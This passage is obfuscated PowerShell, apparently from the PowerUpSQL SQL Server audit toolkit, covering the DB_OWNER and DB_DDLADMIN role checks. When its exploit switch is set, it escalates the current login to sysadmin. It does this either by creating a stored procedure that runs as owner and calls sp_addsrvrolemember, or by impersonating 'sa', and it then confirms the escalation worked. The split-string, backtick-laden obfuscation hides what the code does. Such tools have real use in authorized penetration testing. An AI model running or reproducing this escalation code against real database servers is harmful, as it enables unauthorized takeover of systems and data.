        ${CuRRenTpR`I`NcPA`Ll`Ist}|
        &("{3}{1}{2}{0}{4}" -f 'h-Obje','orE','ac','F','ct') -Process {
            
            ${dBow`NeR} = &("{3}{2}{0}{4}{1}" -f 'b','RoleMember','Data','Get-SQL','ase') -Instance ${In`stAnCe} -Username ${US`Ern`Ame} -Password ${Pas`swO`RD} -Credential ${cR`eDE`NT`iAL} -RolePrincipalName ("{1}{0}"-f'B_OWNER','D') -PrincipalName ${_} -SuppressVerbose

            
            
            
            

            
            if(${Db`OWn`eR})
            {
                
                ${dB`OW`NEr}|
                &("{1}{0}{2}"-f'h-O','ForEac','bject') -Process {
                    ${DAT`Ab`ASet`ArGET} = ${_}."dat`A`BAsENaMe"
                    ${pr`I`N`CiPAlt`Arg`et} = ${_}."pRINCiPAl`N`Ame"

                    &("{2}{1}{0}"-f'erbose','rite-V','W') -Message ("$Instance "+': '+'- '+"$PrincipalTarget "+'has'+' '+'t'+'he '+'DB_'+'OWN'+'ER '+'ro'+'le '+'i'+'n '+'t'+'he '+"$DatabaseTarget "+'d'+'atabase.')
                    ${i`S`VuLner`AbLE} = 'Yes'

                    
                    ${deP`EN`dS} = &("{3}{2}{0}{4}{1}" -f'SQL','abase','et-','G','Dat') -Instance ${in`sTAn`cE} -Username ${uSe`R`NA`mE} -Password ${p`ASSWORd} -Credential ${C`ReDe`Nti`Al} -DatabaseName ${dAT`ABASET`ARGEt} -SuppressVerbose | &("{1}{2}{3}{0}" -f'ct','Wher','e-Obj','e') -FilterScript {
                        ${_}."IS`_`TRUSTwO`Rthy`_On" -eq 1 -and ${_}."o`W`Ne`RIS`sYsadMIN" -eq 1
                    }

                    if(${d`EP`ends})
                    {
                        ${IS`exPlO`ITaB`Le} = 'Yes'
                        &("{3}{2}{0}{1}" -f 't','e-Verbose','ri','W') -Message ("$Instance "+': '+'- '+'T'+'he '+"$DatabaseTarget "+'da'+'tabase '+'is'+' '+'s'+'et '+'a'+'s '+'tru'+'stwo'+'rthy '+'an'+'d '+'i'+'s '+'o'+'wn'+'ed '+'by'+' '+'a '+'sy'+'sadm'+'in'+'. '+'This'+' '+'is'+' '+'e'+'xp'+'loitable.')

                        
                        
                        
                        
                        if(${exPL`Oit})
                        {
                            
                            ${S`ySADmin`Pre`CHeck} = &("{0}{2}{1}{3}" -f'Get-','Quer','SQL','y') -Instance ${i`N`Stan`CE} -Username ${us`e`RnAme} -Password ${pasS`w`O`Rd} -Credential ${CREDE`NTI`Al} -Query ('SELE'+'CT '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'as'+' '+'Statu'+'s') -SuppressVerbose | &("{3}{0}{2}{1}" -f'ele','ct','ct-Obje','S') -Property ("{2}{1}{0}"-f'us','at','St') -ExpandProperty ("{1}{0}"-f 's','Statu')
                            if(${SYsA`dM`i`NPreC`HECk} -ne 1)
                            {
                                
                                &("{2}{0}{1}"-f 'rite-','Verbose','W') -Message ("$Instance "+': '+'- '+'EX'+'P'+'L'+'OITING: '+'Ver'+'ifi'+'ed '+'that'+' '+'t'+'he '+'c'+'ur'+'rent '+'use'+'r '+"($CurrentLogin) "+'is'+' '+'NO'+'T '+'a '+'sy'+'s'+'admin.')
                                &("{1}{0}{3}{4}{2}" -f 'r','W','-Verbose','i','te') -Message ("$Instance "+': '+'- '+'EXPL'+'O'+'I'+'TING: '+'At'+'tempt'+'i'+'ng '+'t'+'o '+'add'+' '+'th'+'e '+'cu'+'rrent'+' '+'use'+'r '+"($CurrentLogin) "+'t'+'o '+'t'+'he '+'sysadmi'+'n'+' '+'ro'+'le '+'b'+'y '+'u'+'sing '+'DB_'+'O'+'WNER '+'pe'+'r'+'mis'+'sions'+'...')

                                ${sP`QU`erY} = ('CREA'+'TE '+'PR'+'OCEDURE'+' '+'s'+'p'+'_ele'+'vate_me'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WI'+'TH '+'EX'+'ECUTE '+'AS'+' '+'OWN'+'ER
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'AS'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'begin
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EX'+'EC '+'sp'+'_add'+'s'+'rv'+'rolem'+'ember '+"'$CurrentLogin','sysadmin'
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'e'+'nd;')

                                
                                ${n`Ull} = &("{1}{2}{3}{0}"-f'ry','Get-SQ','LQu','e') -Instance ${In`STan`cE} -Username ${US`E`Rn`AMe} -Password ${p`A`sswOrd} -Credential ${Cre`DEN`TIAl} -Query "$SpQuery" -SuppressVerbose -Database ${dat`A`BaSetAr`GET}

                                
                                ${nU`ll} = &("{2}{3}{1}{0}"-f'y','LQuer','Ge','t-SQ') -Instance ${InSt`A`NcE} -Username ${UsEr`NA`mE} -Password ${PA`SsW`Ord} -Credential ${credE`NTi`AL} -Query ("{1}{2}{0}{3}"-f 'levate_m','sp_','e','e') -SuppressVerbose -Database ${D`A`TabASE`TaRGEt}

                                
                                ${NU`ll} = &("{1}{2}{0}{3}" -f'LQ','Get-','SQ','uery') -Instance ${inSTA`NCE} -Username ${uSe`RNa`mE} -Password ${pAs`sw`oRd} -Credential ${Cr`E`dEntial} -Query ("{4}{0}{3}{2}{1}" -f'p','_me','evate','_el','DROP PROC s') -SuppressVerbose -Database ${DAtaB`As`E`Ta`RgeT}

                                
                                ${sy`SAdM`InpO`sTCHECK} = &("{1}{2}{3}{0}"-f 'ry','Get-S','Q','LQue') -Instance ${i`N`s`TAnCE} -Username ${uS`Erna`ME} -Password ${PASs`wO`RD} -Credential ${c`RED`En`TIAl} -Query ('SELE'+'CT'+' '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'as'+' '+'St'+'atus') -SuppressVerbose | &("{1}{2}{3}{4}{0}" -f't','Se','l','ect-Obje','c') -Property ("{0}{1}" -f'Statu','s') -ExpandProperty ("{1}{0}"-f 'tatus','S')
                                if(${sYSAdMiN`pOS`TC`hEck} -eq 1)
                                {
                                    &("{1}{0}{2}"-f 'o','Write-Verb','se') -Message ("$Instance "+': '+'- '+'EXP'+'LO'+'ITI'+'NG: '+'I'+'t '+'w'+'as '+'pos'+'sib'+'le '+'to'+' '+'ma'+'ke '+'t'+'he '+'cur'+'rent'+' '+'user'+' '+"($CurrentLogin) "+'a '+'sy'+'s'+'admin!')
                                    ${ex`pl`oIteD} = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                &("{3}{0}{1}{2}"-f'ite-V','erbo','se','Wr') -Message ("$Instance "+': '+'- '+'E'+'XP'+'LOITING:'+' '+'It'+' '+'wa'+'s '+'not'+' '+'po'+'ss'+'ible '+'to'+' '+'m'+'ake '+'the'+' '+'c'+'urrent'+' '+'us'+'er '+"($CurrentLogin) "+'a '+'s'+'ysa'+'dmin.')
                            }

                            
                            ${d`e`TAILS} = ("$PrincipalTarget "+'h'+'as '+'t'+'he '+'DB_'+'OWNER'+' '+'r'+'ole '+'i'+'n '+'th'+'e '+"$DatabaseTarget "+'databas'+'e'+'.')
                            ${NU`ll} = ${t`BLD`AtA}."rO`ws".("{1}{0}" -f'dd','A').Invoke(${c`OmpUTeRN`AMe}, ${INS`T`AnCe}, ${Vu`ln`EraBili`Ty}, ${Des`cri`pt`ioN}, ${rEm`ed`IA`TIOn}, ${SevE`RI`TY}, ${iS`V`ULNErAblE}, ${IsEXPl`O`it`A`BlE}, ${E`xPLOI`TEd}, ${ex`PL`OITCMD}, ${De`TA`ILs}, ${ReFe`R`eNce}, ${AuT`H`oR})
                        }
                        else
                        {
                            
                            ${det`AiLS} = ("$PrincipalTarget "+'h'+'as '+'the'+' '+'DB'+'_OWNE'+'R '+'rol'+'e '+'i'+'n '+'the'+' '+"$DatabaseTarget "+'datab'+'a'+'s'+'e.')
                            ${nu`lL} = ${TBld`Ata}."R`OWS".("{1}{0}" -f'dd','A').Invoke(${CO`MP`U`TErnaME}, ${I`NStA`NcE}, ${vuln`era`B`iliTY}, ${D`EScri`ptI`oN}, ${re`ME`DiAt`IoN}, ${sE`VeR`ity}, ${Isvu`Ln`ErABle}, ${is`E`xpLoiT`ABLE}, ${e`X`PLO`iTed}, ${ExPLO`iT`C`MD}, ${d`etaILs}, ${re`FE`Rence}, ${aU`THOr})
                        }
                    }
                    else
                    {
                        
                        &("{2}{1}{0}"-f'te-Verbose','ri','W') -Message ("$Instance "+': '+'- '+'T'+'he '+"$DatabaseTarget "+'i'+'s '+'not'+' '+'ex'+'p'+'loi'+'table.')
                        ${d`ET`AILS} = ("$PrincipalTarget "+'has'+' '+'t'+'he '+'DB'+'_OWNER '+'r'+'ole '+'in'+' '+'the'+' '+"$DatabaseTarget "+'d'+'a'+'tabase, '+'bu'+'t '+'t'+'his '+'was'+' '+'not'+' '+'exploi'+'tab'+'le.')
                        ${N`ULl} = ${T`BlDATA}."rO`wS".("{1}{0}" -f 'd','Ad').Invoke(${co`mPUtERn`A`me}, ${INSt`An`ce}, ${vUL`Ne`R`Abi`lItY}, ${DESc`RiPTi`oN}, ${R`EMED`IA`TiON}, ${s`evE`Ri`Ty}, ${i`svuL`N`er`ABle}, ${i`sE`XPLOITA`BlE}, ${E`XpLO`IT`eD}, ${e`X`P`LoItcmD}, ${dEtAI`Ls}, ${rEfer`en`CE}, ${aU`Thor})
                    }
                }
            }
        }

        
        &("{3}{0}{1}{2}" -f 'rit','e-Verb','ose','W') -Message ("$Instance "+': '+'COM'+'PLETED'+' '+'VU'+'LN'+'ERABI'+'LITY'+' '+'C'+'HECK'+': '+'D'+'A'+'TABASE '+'ROL'+'E '+'- '+'D'+'B_O'+'WNER')
    }

    End
    {
        
        if ( -not ${N`oo`UtPUt})
        {
            Return ${tb`lDa`Ta}
        }
    }
}






Function iNVOKE`-Sq`LA`U`DIt`ROlEdb`dDL`ADmiN
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDATorY = ${f`A`lSE},
                ValuEfrOMPIPEliNEbYPrOpeRTYNAmE = ${Tr`UE},
        HElpMEsSAgE = {"{11}{8}{2}{10}{12}{13}{1}{3}{7}{14}{9}{4}{0}{6}{5}"-f 'c','ccoun','L Serv','t ','i','with.','ate ','to aut','Q','nt','er','S',' ','or domain a','he'})]
        [string]${u`sern`AME},

        [Parameter(MAnDAtory = ${fA`lSE},
                vAlUEFROMpipELiNEByPROpertYnAME = ${tr`UE},
        hElPmEssaGe = {"{9}{7}{6}{1}{10}{3}{2}{4}{8}{11}{5}{0}" -f '.','or','a','word to ','uthe','th','er ','QL Serv','nticate ','S',' domain account pass','wi'})]
        [string]${pAsSw`o`RD},

        [Parameter(maNDatory = ${f`Alse},
                VALUefrOMpIpeLinEBYpRopERtynAMe = ${Tr`UE},
        HElpMEsSaGe = {"{1}{2}{4}{3}{0}" -f 'ls.','Win','dows cr','tia','eden'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cR`EDent`IaL} =   $0459M2::"e`mPTy",

        [Parameter(maNDATOry = ${fA`lSe},
                vaLUefRoMPiPeLineBYpRoPERTYnaMe = ${t`Rue},
        HelpMESsaGE = {"{9}{7}{1}{5}{10}{0}{4}{2}{6}{3}{8}" -f'e t','ver',' co','n ','o',' instan','nnectio','er','to.','SQL S','c'})]
        [string]${iNs`Tan`cE},

        [Parameter(MaNDAToRY = ${F`A`Lse},
        HELPMESsaGe = {(("{3}{4}{0}{2}{1}" -f'put ','.','anything','Donig','Tt out')) -CreplacE  ([CHAR]105+[CHAR]103+[CHAR]84),[CHAR]39})]
        [string]${no`ouT`PUT},

        [Parameter(manDatoRy = ${faL`sE},
        HELpMEssage = {"{4}{5}{2}{3}{0}{1}" -f 'nerable ','issues.','v','ul','Exploit',' '})]
        [switch]${eX`pl`oiT}
    )

    Begin
    {
        
        ${T`BldA`TA} = &("{0}{2}{1}"-f 'N','Object','ew-') -TypeName ("{6}{5}{2}{1}{4}{0}{3}"-f'b','.DataT','a','le','a','t','System.Da')
        ${n`Ull} = ${TBld`A`Ta}."coLU`mNS".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}"-f'Comput','me','a','erN'))
        ${nu`LL} = ${TBL`d`AtA}."cOluM`NS".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{2}"-f 'I','nsta','nce'))
        ${NU`ll} = ${t`B`LDaTA}."co`LUm`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{3}{4}{1}{2}"-f'Vu','bilit','y','ln','era'))
        ${nU`Ll} = ${TB`L`dATA}."cO`LuM`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f'Descrip','t','ion'))
        ${N`Ull} = ${TB`l`dAtA}."CoLU`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}"-f 'tion','media','Re'))
        ${nU`LL} = ${Tb`l`data}."cOL`UMnS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}" -f'Sever','it','y'))
        ${N`ULl} = ${tbL`D`Ata}."C`o`LuMNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{2}" -f'lne','IsVu','rable'))
        ${N`UlL} = ${t`BLd`Ata}."C`OluM`Ns".("{1}{0}"-f 'dd','A').Invoke(("{4}{3}{2}{0}{1}"-f 'itabl','e','plo','x','IsE'))
        ${nU`Ll} = ${TB`L`DaTA}."COl`Umns".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{2}" -f 'xp','E','loited'))
        ${n`Ull} = ${TB`LDaTa}."coL`UM`NS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f 'x','ploitCmd','E'))
        ${nU`lL} = ${t`B`ldaTa}."Co`luMns".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}" -f 'ls','Detai'))
        ${N`UlL} = ${tBlda`Ta}."c`OLUm`NS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}" -f 'ence','Refer'))
        ${N`ULL} = ${tB`lDaTA}."cOLU`Mns".("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{0}"-f'or','Aut','h'))
    }

    Process
    {
        
        &("{2}{1}{0}{3}" -f 'bos','te-Ver','Wri','e') -Message ("$Instance "+': '+'STA'+'RT '+'VU'+'L'+'NERA'+'BILITY '+'CH'+'ECK'+': '+'D'+'ATA'+'BASE '+'R'+'OLE '+'- '+'DB_'+'DD'+'LA'+'MDIN')

        
        ${tE`STCO`NNec`T`IoN} = &("{3}{0}{4}{2}{1}"-f 'QLConnecti','t','Tes','Get-S','on') -Instance ${InS`Ta`NcE} -Username ${U`sErN`Ame} -Password ${pA`Sswo`RD} -Credential ${c`REDe`NtIAl} -SuppressVerbose | &("{0}{2}{1}" -f'Wh','ect','ere-Obj') -FilterScript {
            ${_}."St`A`TUS" -eq ("{1}{2}{0}"-f'le','Access','ib')
        }
        if(-not ${test`co`N`NEC`TIon})
        {
            
            &("{3}{2}{1}{0}"-f'e','erbos','te-V','Wri') -Message ("$Instance "+': '+'C'+'ONN'+'ECTION '+'FAI'+'L'+'ED')
            &("{1}{2}{0}"-f 'e','Writ','e-Verbos') -Message ("$Instance "+': '+'COM'+'P'+'LE'+'TED '+'V'+'UL'+'NERA'+'BILITY '+'C'+'HECK'+': '+'D'+'A'+'TABASE '+'ROLE'+' '+'- '+'DB'+'_'+'DDLADMIN')
            Return
        }
        else
        {
            &("{1}{2}{3}{0}"-f'ose','Writ','e-Ve','rb') -Message ("$Instance "+': '+'CON'+'NE'+'CTION '+'SUC'+'CESS')
        }

        
        ${Se`RVeR`InFO} = &("{4}{5}{2}{0}{1}{3}" -f'rver','Inf','e','o','Get-SQL','S') -Instance ${INs`T`AN`cE} -Username ${uSErN`A`me} -Password ${pa`s`swOrD} -Credential ${cRe`dENTI`Al} -SuppressVerbose
        ${cOmPu`Te`R`N`AME} = ${sERV`Eri`Nfo}."Com`putE`RNAMe"
        ${currEn`T`LO`gin} = ${SERv`eR`INFO}."Cu`RreNtlo`Gin"
        ${C`U`R`RentloG`i`NroLEs} = &("{4}{1}{0}{2}{3}{5}"-f'-S','t','QL','ServerRol','Ge','eMember') -Instance ${iN`s`T`AncE} -Username ${USE`R`Name} -Password ${pa`SS`wOrD} -Credential ${CReD`e`N`TiAl} -PrincipalName ${cur`RE`N`TLoGIN}  -SuppressVerbose
        ${C`U`R`Re`NtprinCpaLL`iSt} = @()
        ${CurrENTprI`Ncp`A`LLi`st} += ${C`UrrEN`TLogIn}
        ${cU`RREN`TpRinc`PALLI`sT} += ("{0}{1}"-f'Publi','c')
        ${cUr`REn`T`LoG`INrOLeS} | &("{2}{0}{3}{1}" -f 'or','ch-Object','F','Ea') -Process {
            ${C`URRENTPRINcpa`lLI`ST} += ${_}."ROLE`pr`i`NciPa`lNA`ME"
        }

        
        
        
        if(${e`XP`LoIt})
        {
            ${Te`stm`ODE}  = ("{1}{0}" -f't','Exploi')
        }
        else
        {
            ${Te`S`Tmode}  = ("{1}{0}"-f'it','Aud')
        }
        ${vUL`Ne`R`ABilITy} = ("{4}{0}{5}{3}{1}{2}" -f'L','I','N',' - DB_DDLADM','DATABASE RO','E')
        ${d`EsC`RI`ptioN}   = ("{56}{31}{57}{24}{14}{22}{45}{0}{38}{58}{8}{17}{4}{1}{27}{28}{18}{21}{5}{60}{11}{25}{30}{41}{54}{26}{6}{52}{53}{55}{36}{62}{48}{37}{13}{49}{43}{2}{7}{15}{34}{12}{35}{19}{61}{20}{16}{47}{3}{40}{10}{50}{33}{29}{46}{32}{51}{39}{23}{44}{42}{9}{59}"-f 'D','one or','in if the a','owned','in ',' Th','e login','ffected',' ','ad','a s','s ',' ','l','s',' data','an','role ','re database','ru','ed ','s. ',' th','b','login ha','m','h',' ','mo','n, or if a custom a','a','h','ly','i','bases','are t','s','ivi','DL','can ',' by ','y a','o',' to sysadm','e l','e DB_','ssemb','d ','pr','eges','ysadm',' ',' t','o','llow t',' e','T','e ','ADMIN','ed.','i','st','calate ')
        ${reme`dIA`Ti`oN}   = ((("{26}{24}{45}{54}{25}{29}{16}{55}{37}{6}{4}{27}{41}{33}{35}{46}{38}{28}{50}{48}{7}{14}{1}{32}{49}{56}{34}{43}{8}{30}{36}{53}{31}{58}{39}{3}{9}{42}{57}{19}{10}{59}{2}{22}{13}{52}{23}{11}{0}{44}{18}{17}{21}{20}{5}{40}{12}{51}{47}{15}" -f 'er','p_',':','d can b','move it.  Permi','INIvb','red re','EC','B_DDLAD','e',' co','b',' Ivb','rop',' s','vb','sio','bD','Iv','d with a','DM','B_DDLA','  EXEC sp_d','olemem','the ','i','If ','ssi','nd l','s','MINIvb, ','yDb','addr','ranted ','mber I','with a co','Ivb','t requi','ma','erIvb, an',',','ons are g',' r','vbD',' ','p','m','bUserI',' EX','olem','ike:','MyD','r','M','erm','n is no','e','emove','Us','mmand like'))."r`E`PLACe"(([CHaR]73+[CHaR]118+[CHaR]98),[StriNG][CHaR]39))
        ${S`eVe`R`ItY}      = ("{0}{1}" -f'M','edium')
        ${Isv`Ul`NEr`Able}  = 'No'
        ${ISEXP`L`oIt`Ab`lE} = 'No'
        ${ExpL`O`iTED}     = 'No'
        ${eXPlOi`T`cmd}    = ("{8}{9}{0}{11}{6}{4}{7}{3}{12}{10}{5}{2}{1}" -f 'loit comman','.',' used','ut a cu',',','be','ble at this time',' b','No ex','p','ld ','d is availa','stom assesmbly cou')
        ${det`A`iLs}       = ''
        ${d`EPeN`da`NCIes}  = ("{26}{10}{29}{17}{25}{24}{30}{15}{5}{16}{0}{11}{9}{3}{2}{1}{22}{31}{14}{20}{4}{27}{28}{7}{19}{12}{18}{21}{6}{13}{23}{8}" -f ' and b','Or it m','. ','ted','load a','adm',' e','ly ','ss.','s','s','e tru','nfig','xternal ac','e p','ys','in','e o','u','co','ossible to ','red for','u','ce','ed ','wn','Affected databases mu',' custom',' assemb','t b','by a s','st b')
        ${ReF`ER`EnCE}     = ("{2}{6}{3}{0}{4}{5}{1}{9}{8}{10}{7}"-f 's','6','https://technet.mi','ft.com/en-u','/library/m','s189','croso','aspx','q','12(v=s','l.105).')
        ${aU`T`HOR}        = (("{0}{5}{6}{7}{2}{4}{9}{3}{8}{1}{10}"-f 'S','nd), N','Sutherl','(','a','cot','t',' ','@_nullbi','nd ','etSPI 2016'))

        
        
        
        

        
        ${c`UrRe`NtPrI`Ncpall`iST}|
        &("{1}{0}{3}{2}" -f'-Obje','ForEach','t','c') -Process {
            
            ${Db`dD`ladmIn} = &("{2}{0}{3}{4}{5}{1}" -f 'SQLDa','ember','Get-','tab','ase','RoleM') -Instance ${iNstAn`Ce} -Username ${useR`NAmE} -Password ${pAsS`wO`Rd} -Credential ${crE`deNT`I`Al} -RolePrincipalName ("{1}{0}{2}"-f'_DDLADM','DB','IN') -PrincipalName ${_} -SuppressVerbose

            
            
            
            

            
            if(${DbddLa`Dm`in})
            {
                
                ${dbdDL`AD`M`IN}|
                &("{1}{3}{2}{0}"-f'bject','ForE','ch-O','a') -Process {
                    ${dA`T`AbAse`TaR`geT} = ${_}."DATa`B`AS`enAmE"
                    ${PrInCI`Pa`LtarG`eT} = ${_}."PRI`NCIp`AlnAMe"

                    &("{3}{1}{2}{0}"-f'bose','te-Ve','r','Wri') -Message ("$Instance "+': '+'- '+"$PrincipalTarget "+'ha'+'s '+'t'+'he '+'D'+'B_'+'D'+'DLADMIN '+'rol'+'e '+'i'+'n '+'the'+' '+"$DatabaseTarget "+'data'+'base'+'.')
                    ${isvU`lNe`RABLe} = 'Yes'

                    
                    ${DEP`En`ds} = &("{0}{2}{1}"-f'Ge','se','t-SQLDataba') -Instance ${I`NSt`AncE} -Username ${u`s`ERNaMe} -Password ${PA`s`swORd} -Credential ${C`REdE`NTiaL} -DatabaseName ${datab`ASetAr`gEt} -SuppressVerbose | &("{2}{1}{0}"-f 'ct','ere-Obje','Wh') -FilterScript {
                        ${_}."I`s_Tr`Ust`woR`Th`Y_on" -eq 1 -and ${_}."o`WNEr`iSsysADmin" -eq 1
                    }

                    if(${dE`p`ENDS})
                    {
                        ${Ise`xPloi`Table} = 'No'
                        &("{0}{2}{3}{4}{1}" -f 'Wr','ose','ite-','V','erb') -Message ("$Instance "+': '+'- '+'T'+'he '+"$DatabaseTarget "+'datab'+'ase'+' '+'i'+'s '+'s'+'et '+'a'+'s '+'t'+'r'+'us'+'tworthy '+'and'+' '+'is'+' '+'o'+'wned '+'b'+'y '+'a '+'sysadm'+'in.'+' '+'T'+'his '+'i'+'s '+'exploita'+'bl'+'e'+'.')

                        
                        
                        
                        
                        if(${Ex`Pl`oiT})
                        {
                            
                            ${SY`sA`DmINprec`h`eck} = &("{0}{1}{2}"-f 'G','et-SQ','LQuery') -Instance ${I`N`STAnCe} -Username ${uSE`RN`AMe} -Password ${paSs`W`oRd} -Credential ${CREDEn`TI`Al} -Query ('S'+'ELECT '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'a'+'s '+'Sta'+'tus') -SuppressVerbose | &("{1}{2}{0}"-f'ct','Select','-Obje') -Property ("{0}{1}{2}" -f'Sta','t','us') -ExpandProperty ("{2}{1}{0}"-f 's','atu','St')
                            if(${s`YS`A`DMinprecHECK} -ne 1)
                            {
                                
                                &("{2}{1}{3}{0}"-f 'e','ite-Verb','Wr','os') -Message ("$Instance "+': '+'- '+'E'+'X'+'PL'+'OITING: '+'Ve'+'ri'+'fied '+'that'+' '+'th'+'e '+'c'+'urren'+'t '+'u'+'ser '+"($CurrentLogin) "+'is'+' '+'NO'+'T '+'a '+'sys'+'ad'+'min.')
                                &("{1}{2}{0}"-f'e','Write-','Verbos') -Message ("$Instance "+': '+'- '+'E'+'X'+'PLOIT'+'ING: '+'Atte'+'mp'+'ting'+' '+'t'+'o '+'a'+'dd '+'th'+'e '+'curre'+'n'+'t '+'u'+'ser '+"($CurrentLogin) "+'t'+'o '+'the'+' '+'sysadmi'+'n '+'rol'+'e '+'b'+'y '+'usi'+'n'+'g '+'D'+'B_OW'+'NER '+'p'+'ermiss'+'io'+'ns.'+'..')

                                
                                ${NU`ll} = &("{0}{1}{2}"-f'Get-','SQLQ','uery') -Instance ${iNS`TaNce} -Username ${U`sErnaME} -Password ${pAS`swoRD} -Credential ${c`R`edE`NtIAL} -Query ('EX'+'ECUT'+'E '+'A'+'S '+'L'+'OGIN '+'= '+(('nUwsa'+'nUw;EXEC ')  -RePlACe'nUw',[cHaR]39)+'sp_ad'+'ds'+'rvr'+'oleme'+'mb'+'e'+'r '+"'$CurrentLogin','sysadmin';Revert") -SuppressVerbose

                                
                                ${sy`S`A`d`mIN`pOStCHeck} = &("{2}{3}{1}{0}"-f'y','uer','Ge','t-SQLQ') -Instance ${In`STan`ce} -Username ${U`SerN`Ame} -Password ${P`Ass`Word} -Credential ${cre`d`enT`iAL} -Query ('SELEC'+'T '+"IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') "+'as'+' '+'Sta'+'t'+'us') -SuppressVerbose | &("{0}{3}{1}{2}" -f 'S','ect-O','bject','el') -Property ("{2}{1}{0}" -f 's','tatu','S') -ExpandProperty ("{0}{1}"-f'S','tatus')
                                if(${SyS`AdmIn`P`oStCHEcK} -eq 1)
                                {
                                    &("{0}{1}{2}{3}" -f'Writ','e-Verbo','s','e') -Message ("$Instance "+': '+'- '+'E'+'XPL'+'OITIN'+'G: '+'It'+' '+'w'+'as '+'p'+'oss'+'ible '+'t'+'o '+'m'+'ake '+'th'+'e '+'curren'+'t'+' '+'user'+' '+"($CurrentLogin) "+'a '+'sysadm'+'in!')
                                    ${ExpLo`i`TEd} = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                &("{2}{1}{0}"-f 'se','bo','Write-Ver') -Message ("$Instance "+': '+'- '+'EXPLO'+'ITING'+':'+' '+'It'+' '+'w'+'as '+'n'+'ot '+'poss'+'ible'+' '+'to'+' '+'make'+' '+'t'+'he '+'cur'+'ren'+'t '+'use'+'r '+"($CurrentLogin) "+'a '+'s'+'ysa'+'dmin.')
                            }

                            
                            ${D`EtaILS} = ("$PrincipalTarget "+'has'+' '+'th'+'e '+'DB_DD'+'LADMI'+'N '+'role'+' '+'in'+' '+'t'+'he '+"$DatabaseTarget "+'data'+'b'+'ase.')
                            ${Nu`Ll} = ${tblda`Ta}."RO`wS".("{0}{1}" -f'A','dd').Invoke(${CompUtE`RnA`mE}, ${iNSTA`N`CE}, ${v`ULN`E`Ra`BIlITY}, ${DEscRip`T`Ion}, ${R`E`med`iaTiON}, ${sev`er`I`Ty}, ${Is`VULn`Er`AB`Le}, ${i`sEX`plOITA`B`lE}, ${e`XPl`oiTed}, ${Ex`plOi`Tc`Md}, ${dE`T`AIls}, ${refEr`EN`cE}, ${Au`Th`Or})
                        }
                        else
                        {
                            
                            ${D`e`TaILs} = ("$PrincipalTarget "+'h'+'as '+'th'+'e '+'D'+'B_DD'+'LADMIN '+'ro'+'le '+'in'+' '+'t'+'he '+"$DatabaseTarget "+'data'+'base'+'.')
                            ${Nu`LL} = ${tb`LD`Ata}."ro`WS".("{0}{1}"-f 'Ad','d').Invoke(${c`om`PuTe`RNAme}, ${in`StAn`Ce}, ${vulNe`RaB`IL`Ity}, ${Des`c`RIpTION}, ${R`emEDI`AT`ioN}, ${Se`V`erity}, ${i`sVU`lNE`RA`BLe}, ${iSE`Xplo`itABle}, ${EXP`lo`it`ED}, ${Ex`Plo`itcMD}, ${DeT`Ai`ls}, ${r`EFeren`Ce}, ${aut`h`Or})
                        }
                    }
                    else
                    {
                        
                        &("{3}{0}{1}{2}"-f 't','e-Verb','ose','Wri') -Message ("$Instance "+': '+'- '+'Th'+'e '+"$DatabaseTarget "+'is'+' '+'no'+'t '+'expl'+'o'+'ita'+'ble.')
                        ${DeTA`iLS} = ("$PrincipalTarget "+'has'+' '+'th'+'e '+'DB_DDLADMI'+'N'+' '+'rol'+'e '+'i'+'n '+'th'+'e '+"$DatabaseTarget "+'dat'+'abas'+'e, '+'but'+' '+'th'+'is '+'wa'+'s '+'n'+'ot '+'e'+'xp'+'loitable.')
                        ${N`Ull} = ${tB`LDa`TA}."r`oWs".("{1}{0}" -f'd','Ad').Invoke(${c`o`m`PuTERnAME}, ${In`stA`NcE}, ${vUlNeRab`i`LiTy}, ${de`S`CripTiOn}, ${RE`m`EDI`ATION}, ${SEverI`Ty}, ${I`sv`UlN`eRa`BLE}, ${iSExPL`oI`T`A`BLE}, ${EXpLo`I`TeD}, ${EXp`Lo`ITCMd}, ${DE`TA`ilS}, ${R`eFEreN`cE}, ${Au`T`hor})
                    }
                }
            }
        }

        
        &("{1}{0}{2}{4}{3}"-f 'r','W','i','e-Verbose','t') -Message ("$Instance "+': '+'COM'+'PLE'+'TED '+'V'+'U'+'LNERAB'+'ILITY '+'CHEC'+'K'+': '+'DATABA'+'S'+'E '+'R'+'OLE '+'- '+'D'+'B_DDLADMI'+'N')
    }

    End
    {
        
        if ( -not ${n`OO`U`TPUT})
        {
            Return ${tBl`DaTA}
        }
    }
